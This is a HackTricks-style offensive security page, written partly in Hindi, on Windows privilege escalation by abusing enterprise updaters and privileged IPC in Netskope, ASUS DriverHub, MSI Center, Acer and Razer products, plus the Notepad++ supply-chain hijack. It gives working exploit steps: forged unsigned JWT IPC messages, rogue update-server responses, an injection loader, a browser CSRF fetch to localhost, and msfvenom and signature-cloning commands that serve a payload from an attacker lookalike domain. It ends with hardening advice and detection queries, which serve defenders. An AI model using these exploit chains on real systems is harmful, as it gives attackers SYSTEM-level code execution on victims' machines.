# Enterprise Auto-Updaters and Privileged IPC का Abuse करना (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

यह पेज Windows local privilege escalation chains की एक class को generalize करता है, जो enterprise endpoint agents और updaters में मिलती हैं, जो low-friction IPC surface और privileged update flow expose करते हैं। एक representative example Netskope Client for Windows < R129 (CVE-2025-0309) है, जहाँ एक low-privileged user attacker-controlled server में enrollment को coerce कर सकता है और फिर एक malicious MSI deliver कर सकता है जिसे SYSTEM service install करता है।

ऐसे similar products के against आप जिन key ideas का reuse कर सकते हैं:
- privileged service की localhost IPC का abuse करके re-enrollment या attacker server पर reconfiguration force करना।
- vendor के update endpoints implement करना, एक rogue Trusted Root CA deliver करना, और updater को malicious, “signed” package की ओर point करना।
- weak signer checks (CN allow-lists), optional digest flags, और lax MSI properties evade करना।
- अगर IPC “encrypted” है, तो registry में stored world-readable machine identifiers से key/IV derive करना।
- अगर service callers को image path/process name के आधार पर restrict करती है, तो allow-listed process में inject करना या उसे suspended spawn करके minimal thread-context patch के जरिए अपनी DLL bootstrap करना।

---
## 1) localhost IPC के जरिए enrollment को attacker server पर force करना

कई agents एक user-mode UI process ship करते हैं जो localhost TCP पर JSON के जरिए एक SYSTEM service से बात करता है।

Netskope में observed:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) एक JWT enrollment token craft करें, जिसके claims backend host को control करते हों (e.g., AddonUrl)। Signature की जरूरत न हो इसलिए alg=None use करें।
2) अपने JWT और tenant name के साथ provisioning command invoke करने वाला IPC message भेजें:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) सर्विस enrollment/config के लिए आपके rogue server को hit करना शुरू करती है, जैसे:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- अगर caller verification path/name-based है, तो request को allow-listed vendor binary से originate करें (देखें §4).

---
## 2) update channel को hijack करके code को SYSTEM के रूप में run करना

एक बार client आपके server से बात करने लगे, expected endpoints implement करें और उसे attacker MSI की ओर steer करें। Typical sequence:

1) /v2/config/org/clientconfig → बहुत short updater interval के साथ JSON config return करें, जैसे:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Return a PEM CA certificate. The service installs it into the Local Machine Trusted Root store.
3) /v2/checkupdate → Supply metadata pointing to a malicious MSI and a fake version.

Bypassing common checks seen in the wild:
- Signer CN allow-list: the service may only check the Subject CN equals “netSkope Inc” or “Netskope, Inc.”. Your rogue CA can issue a leaf with that CN and sign the MSI.
- CERT_DIGEST property: include a benign MSI property named CERT_DIGEST. No enforcement at install.
- Optional digest enforcement: config flag (e.g., check_msi_digest=false) disables extra cryptographic validation.

Result: The SYSTEM service installs your MSI from
C:\ProgramData\Netskope\stAgent\data\*.msi
executing arbitrary code as NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

From R127, Netskope wrapped IPC JSON in an encryptData field that looks like Base64. Reversing showed AES with key/IV derived from registry values readable by any user:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers can reproduce encryption and send valid encrypted commands from a standard user. General tip: if an agent suddenly “encrypts” its IPC, look for device IDs, product GUIDs, install IDs under HKLM as material.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Some services try to authenticate the peer by resolving the TCP connection’s PID and comparing the image path/name against allow-listed vendor binaries located under Program Files (e.g., stagentui.exe, bwansvc.exe, epdlp.exe).

Two practical bypasses:
- DLL injection into an allow-listed process (e.g., nsdiag.exe) and proxy IPC from inside it.
- Spawn an allow-listed binary suspended and bootstrap your proxy DLL without CreateRemoteThread (see §5) to satisfy driver-enforced tamper rules.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Products often ship a minifilter/OB callbacks driver (e.g., Stadrv) to strip dangerous rights from handles to protected processes:
- Process: removes PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restricts to THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

A reliable user-mode loader that respects these constraints:
1) CreateProcess of a vendor binary with CREATE_SUSPENDED.
2) Obtain handles you’re still allowed to: PROCESS_VM_WRITE | PROCESS_VM_OPERATION on the process, and a thread handle with THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (or just THREAD_RESUME if you patch code at a known RIP).
3) Overwrite ntdll!NtContinue (or other early, guaranteed-mapped thunk) with a tiny stub that calls LoadLibraryW on your DLL path, then jumps back.
4) ResumeThread to trigger your stub in-process, loading your DLL.

Because you never used PROCESS_CREATE_THREAD or PROCESS_SUSPEND_RESUME on an already-protected process (you created it), the driver’s policy is satisfied.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automates a rogue CA, malicious MSI signing, and serves the needed endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope is a custom IPC client that crafts arbitrary (optionally AES-encrypted) IPC messages and includes the suspended-process injection to originate from an allow-listed binary.

## 7) Fast triage workflow for unknown updater/IPC surfaces

When facing a new endpoint agent or motherboard “helper” suite, a quick workflow is usually enough to tell whether you are looking at a promising privesc target:

1) Enumerate loopback listeners and map them back to vendor processes:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) संभावित named pipes की enumerate करें:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) plugin-based IPC servers द्वारा उपयोग किए जाने वाले registry-backed routing data को mine करें:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) पहले user-mode client से endpoint names, JSON keys, और command IDs extract करें. Packed Electron/.NET frontends अक्सर पूरा schema leak करते हैं:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) वास्तविक trust predicate को ढूँढें, न कि सिर्फ उस code path को जो अंततः process launch करता है:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Patterns worth prioritizing:
- `CryptQueryObject`/certificate parsing without `WinVerifyTrust` usually means “certificate exists” was treated as “certificate is trusted”, enabling certificate cloning or other fake-signer tricks.
- Substring/suffix checks over `Origin`, `Referer`, download URLs, process names, or signer CNs are not authentication. `contains(".vendor.com")` is usually exploitable with attacker-controlled lookalike domains.
- If the low-privileged GUI decides “the file is trusted” and the SYSTEM broker merely consumes that result, patching or reimplementing the client-side DLL/JS often bypasses the boundary entirely (Razer-style split validation).
- If the broker copies a payload to `%TEMP%`/`C:\Windows\Temp` and then validates or schedules it from that path, immediately test for TOCTOU replacement windows and for sibling plugin modules that expose alternate `ExecuteTask()` wrappers with weaker checks.

For named-pipe-heavy targets, PipeViewer is a quick way to spot weak DACLs and remotely reachable pipes before you start reversing the protocol in depth.

If the target authenticates callers only by PID, image path, or process name, treat that as a speed bump rather than a boundary: injecting into the legitimate client, or making the connection from an allow-listed process, is often enough to satisfy the server’s checks. For named pipes specifically, [this page about client impersonation and pipe abuse](named-pipe-client-impersonation.md) covers the primitive in more depth.

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub एक user-mode HTTP service (ADU.exe) 127.0.0.1:53000 पर ships करता है, जो https://driverhub.asus.com से आने वाली browser calls की अपेक्षा करता है। origin filter बस `string_contains(".asus.com")` को Origin header और `/asus/v1.0/*` द्वारा exposed download URLs पर perform करता है। इसलिए कोई भी attacker-controlled host जैसे `https://driverhub.asus.com.attacker.tld` check पास कर देता है और JavaScript से state-changing requests issue कर सकता है। अतिरिक्त bypass patterns के लिए [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) देखें।

Practical flow:
1) एक domain register करें जो `.asus.com` embed करता हो और वहाँ एक malicious webpage host करें।
2) `fetch` या XHR का उपयोग करके `http://127.0.0.1:53000` पर एक privileged endpoint (जैसे, `Reboot`, `UpdateApp`) call करें।
3) handler द्वारा expected JSON body send करें – packed frontend JS नीचे schema दिखाता है।
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
नीचे दिखाया गया PowerShell CLI भी तब सफल होता है जब Origin header को trusted value पर spoof किया जाता है:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1-click (or 0-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` downloads arbitrary executables defined in the JSON body and caches them in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Download URL validation reuses the same substring logic, so `http://updates.asus.com.attacker.tld:8000/payload.exe` is accepted. After download, ADU.exe merely checks that the PE contains a signature and that the Subject string matches ASUS before running it – no `WinVerifyTrust`, no chain validation.

To weaponize the flow:
1) Create a payload (e.g., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clone ASUS’s signer into it (e.g., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Host `pwn.exe` on a `.asus.com` lookalike domain and trigger UpdateApp via the browser CSRF above.

Because both the Origin and URL filters are substring-based and the signer check only compares strings, DriverHub pulls and executes the attacker binary under its elevated context.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Center’s SYSTEM service exposes a TCP protocol where each frame is `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. The core component (Component ID `0f 27 00 00`) ships `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Its handler:
1) Copies the supplied executable to `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifies the signature via `CS_CommonAPI.EX_CA::Verify` (certificate subject must equal “MICRO-STAR INTERNATIONAL CO., LTD.” and `WinVerifyTrust` succeeds).
3) Creates a scheduled task that runs the temp file as SYSTEM with attacker-controlled arguments.

The copied file is not locked between verification and `ExecuteTask()`. An attacker can:
- Send Frame A pointing to a legitimate MSI-signed binary (guarantees the signature check passes and the task is queued).
- Race it with repeated Frame B messages that point to a malicious payload, overwriting `MSI Center SDK.exe` just after verification completes.

When the scheduler fires, it executes the overwritten payload under SYSTEM despite having validated the original file. Reliable exploitation uses two goroutines/threads that spam CMD_AutoUpdateSDK until the TOCTOU window is won.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Every plugin/DLL loaded by `MSI.CentralServer.exe` receives a Component ID stored under `HKLM\SOFTWARE\MSI\MSI_CentralServer`. The first 4 bytes of a frame select that component, allowing attackers to route commands to arbitrary modules.
- Plugins can define their own task runners. `Support\API_Support.dll` exposes `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` and directly calls `API_Support.EX_Task::ExecuteTask()` with **no signature validation** – any local user can point it at `C:\Users\<user>\Desktop\payload.exe` and get SYSTEM execution deterministically.
- Sniffing loopback with Wireshark or instrumenting the .NET binaries in dnSpy quickly reveals the Component ↔ command mapping; custom Go/ Python clients can then replay frames.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) exposes `\\.\pipe\treadstone_service_LightMode`, and its discretionary ACL allows remote clients (e.g., `\\TARGET\pipe\treadstone_service_LightMode`). Sending command ID `7` with a file path invokes the service’s process-spawning routine.
- The client library serializes a magic terminator byte (113) along with args. Dynamic instrumentation with Frida/`TsDotNetLib` (see [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) for instrumentation tips) shows that the native handler maps this value to a `SECURITY_IMPERSONATION_LEVEL` and integrity SID before calling `CreateProcessAsUser`.
- Swapping 113 (`0x71`) for 114 (`0x72`) drops into the generic branch that keeps the full SYSTEM token and sets a high-integrity SID (`S-1-16-12288`). The spawned binary therefore runs as unrestricted SYSTEM, both locally and cross-machine.
- Combine that with the exposed installer flag (`Setup.exe -nocheck`) to stand up ACC even on lab VMs and exercise the pipe without vendor hardware.

These IPC bugs highlight why localhost services must enforce mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) and why every module’s “run arbitrary binary” helper must share the same signer verifications.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4 added another useful pattern to this family: a low-privileged user can ask a COM helper to launch a process through `RzUtility.Elevator`, while the trust decision is delegated to a user-mode DLL (`simple_service.dll`) rather than being enforced robustly inside the privileged boundary.

Observed exploitation path:
- Instantiate the COM object `RzUtility.Elevator`.
- Call `LaunchProcessNoWait(<path>, "", 1)` to request an elevated launch.
- In the public PoC, the PE-signature gate inside `simple_service.dll` is patched out before issuing the request, allowing an arbitrary attacker-chosen executable to be launched.

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
General takeaway: when reversing “helper” suites, do not stop at localhost TCP or named pipes. Check for COM classes with names such as `Elevator`, `Launcher`, `Updater`, or `Utility`, then verify whether the privileged service actually validates the target binary itself or merely trusts a result computed by a patchable user-mode client DLL. This pattern generalizes beyond Razer: any split design where the high-privilege broker consumes an allow/deny decision from the low-privilege side is a candidate privesc surface.

---
## कमजोर updater validation के जरिए Remote supply-chain hijack (WinGUp / Notepad++)

June 2025 और December 2025 के बीच, Notepad++ update flow के पीछे की hosting infrastructure को compromise करने वाले attackers ने चुने हुए victims को malicious manifests selectively serve किए। पुराने WinGUp-based updaters update authenticity को पूरी तरह verify नहीं करते थे, इसलिए एक hostile XML response clients को attacker-controlled URLs पर redirect कर सकता था। क्योंकि client ने downloaded installer पर trusted certificate chain और valid PE signature दोनों enforce किए बिना HTTPS content accept कर लिया, victims ने trojanized NSIS `update.exe` fetch और execute किया।

Operational flow (no local exploit required):
1. **Infrastructure interception**: CDN/hosting को compromise करें और attacker metadata के साथ update checks का जवाब दें, जो एक malicious download URL की ओर इशारा करे।
2. **Trojanized NSIS**: installer एक payload fetch/execute करता है और दो execution chains का abuse करता है:
- **Bring-your-own signed binary + sideload**: signed Bitdefender `BluetoothService.exe` bundle करें और उसकी search path में malicious `log.dll` drop करें। जब signed binary run होता है, Windows `log.dll` sideload करता है, जो Chrysalis backdoor को decrypt करके reflectively load करता है (Warbird-protected + API hashing static detection को hinder करने के लिए)।
- **Scripted shellcode injection**: NSIS एक compiled Lua script execute करता है जो Win32 APIs (जैसे, `EnumWindowStationsW`) का उपयोग करके shellcode inject करता है और Cobalt Strike Beacon stage करता है।

Hardening/detection takeaways for any auto-updater:
- Downloaded installer की **certificate + signature verification** enforce करें (vendor signer pin करें, mismatched CN/chain reject करें) और update manifest को खुद sign करें (e.g., XMLDSig)। जब तक validate न हो, manifest-controlled redirects block करें।
- **BYO signed binary sideloading** को post-download detection pivot की तरह treat करें: alert करें जब कोई signed vendor EXE अपनी canonical install path के बाहर से किसी DLL name को load करे (e.g., Bitdefender द्वारा `log.dll` को Temp/Downloads से load करना) और जब कोई updater temp से non-vendor signatures वाले installers drop/execute करे।
- इस chain में देखे गए **malware-specific artifacts** monitor करें (generic pivots के रूप में उपयोगी): mutex `Global\Jdhfv_1.0.1`, `%TEMP%` में anomalous `gup.exe` writes, और Lua-driven shellcode injection stages।
- Notepad++ ने v8.8.9 और बाद के versions में WinGUp को मजबूत करके respond किया: returned XML अब signed है (XMLDSig), और newer builds transport alone पर trust करने के बजाय downloaded installer की certificate + signature verification enforce करते हैं।

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> launching a non-Notepad++ installer</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

ये पैटर्न किसी भी updater पर सामान्यीकृत होते हैं जो unsigned manifests स्वीकार करता है या installer signers को pin करने में विफल रहता है—network hijack + malicious installer + BYO-signed sideloading “trusted” updates के guise में remote code execution देता है।

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)

{{#include ../../banners/hacktricks-training.md}}
